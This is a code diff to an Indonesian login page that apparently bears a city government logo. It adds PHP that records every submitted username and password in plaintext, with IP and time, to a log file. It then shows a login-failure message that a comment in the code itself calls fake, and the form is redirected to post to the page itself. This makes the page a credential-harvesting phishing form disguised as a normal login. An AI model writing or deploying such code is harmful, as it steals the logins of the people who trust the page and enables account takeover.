@@ -1,3 +1,21 @@
+<?php
+// Proses login (jika ada permintaan POST)
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $timestamp = date('Y-m-d H:i:s');
+
+    // Simpan ke file log
+    $log = "login_logs.txt";
+    $logData = "[$timestamp] IP: $ip | Username: $username | Password: $password\n";
+    file_put_contents($log, $logData, FILE_APPEND);
+
+    // Tampilkan pesan palsu
+    $login_message = "Login gagal. Nama pengguna atau sandi salah.";
+}
+?>
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -45,10 +63,10 @@
       font-weight: bold;
     }
     .logo {
-    display: block;
-    margin: 0 auto 1rem auto; /* center + jarak bawah */
-    max-width: 170px;          /* ukuran maksimal logo */
-    height: auto;
+      display: block;
+      margin: 0 auto 1rem auto;
+      max-width: 170px;
+      height: auto;
     }
     button:hover {
       background: #0056b3;
@@ -58,17 +76,25 @@
       text-align: center;
       margin-top: 1rem;
     }
+    .message {
+      color: red;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
   </style>
 </head>
 <body>
   <div class="login-container">
     <img src="./images/pemkot.png" alt="Logo" class="logo" />
     <h2>Login</h2>
-    <form action="/login" method="POST">
+    <?php if (!empty($login_message)) : ?>
+      <div class="message"><?= htmlspecialchars($login_message) ?></div>
+    <?php endif; ?>
+    <form method="POST" action="">
       <input type="text" name="username" placeholder="Nama pengguna" required>
       <input type="password" name="password" placeholder="Kata sandi" required>
       <button type="submit">Masuk</button>
-      <a class="link" href="register.html">Belum punya akun? Daftar</a>
+      <a class="link" href="register.php">Belum punya akun? Daftar</a>
     </form>
   </div>
 </body>
